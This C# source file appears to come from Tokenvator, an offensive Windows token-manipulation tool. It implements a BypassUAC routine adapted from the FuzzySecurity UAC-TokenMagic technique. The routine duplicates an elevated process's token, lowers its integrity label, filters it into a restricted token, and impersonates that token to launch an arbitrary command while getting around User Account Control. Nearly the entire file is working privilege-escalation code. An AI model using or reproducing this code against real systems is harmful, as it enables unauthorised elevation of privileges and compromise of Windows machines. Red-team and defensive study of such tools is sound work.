using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

using Tokenvator.Resources;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator.Plugins.AccessTokens
{
    class RestrictedToken : AccessTokens
    {
        IntPtr luaToken;

        internal RestrictedToken(IntPtr hToken) : base(hToken)
        {
            luaToken = new IntPtr();
            Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public bool BypassUAC(int processId, string command)
        {
            if (!_GetPrimaryToken((uint)processId))
                return false;

            if (!_SetTokenInformation())
                return false;

            if (!_DuplicateToken())
                return false;

            string arguments = string.Empty;
            Misc.FindExe(ref command, out arguments);

            if (!CreateProcess.CreateProcessWithLogonW(phNewToken, command, arguments))
            {
                return false;
            }

            advapi32.RevertToSelf();
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private bool _GetPrimaryToken(uint processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Winnt.PROCESS_QUERY_LIMITED_INFORMATION, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                Console.WriteLine(" [-] Unable to Open Process Token: {0}", processId);
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0}", processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            try
            {
                if (!kernel32.OpenProcessToken(hProcess, (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
                {
                    Console.WriteLine(" [-] Unable to Open Process Token");
                    Misc.GetWin32Error("OpenProcessToken");
                    return false;
                }
                Console.WriteLine(" [+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                kernel32.CloseHandle(hProcess);
            }

            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (uint)(Winnt.TOKEN_ALL_ACCESS),
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                Misc.GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Existing Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            Console.WriteLine(" [+] New Token Handle: 0x{0}", phNewToken.ToString("X4"));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private bool _SetTokenInformation()
        {
            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY
            {
                Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 } //16 - all
            };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (!advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                Misc.GetWin32Error("AllocateAndInitializeSid: ");
                return false;
            }

            Console.WriteLine(" [+] Initialized SID: 0x{0}", pSID.ToString("X4"));

            Winnt._SID_AND_ATTRIBUTES sidAndAttributes = new Winnt._SID_AND_ATTRIBUTES
            {
                Sid = pSID,
                Attributes = (uint)Winnt.SE_GROUP_INTEGRITY_32
            };
            try
            {
                Winnt._TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt._TOKEN_MANDATORY_LABEL
                {
                    Label = sidAndAttributes
                };
                int tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);

                if (0 != ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize))
                {
                    Misc.GetWin32Error("NtSetInformationToken: ");
                    return false;
                }
                Console.WriteLine(" [+] Set Token Information On: 0x{0}", phNewToken.ToString("X4"));

                if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
                {
                    Misc.GetWin32Error("NtFilterToken: ");
                    return false;
                }
                Console.WriteLine(" [+] LUA Token Handle: 0x{0}", luaToken.ToString("X4"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                advapi32.FreeSid(pSID);
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private bool _DuplicateToken()
        {
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        luaToken,
                        Winnt.TOKEN_IMPERSONATE | Winnt.TOKEN_QUERY,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenImpersonation,
                        out phNewToken
            ))
            {
                Misc.GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle : 0x{0}", phNewToken.ToString("X4"));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public new void Dispose()
        {
            if (IntPtr.Zero != luaToken)
                kernel32.CloseHandle(luaToken);
            base.Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        ~RestrictedToken()
        {
            Dispose();
        }
    }
}
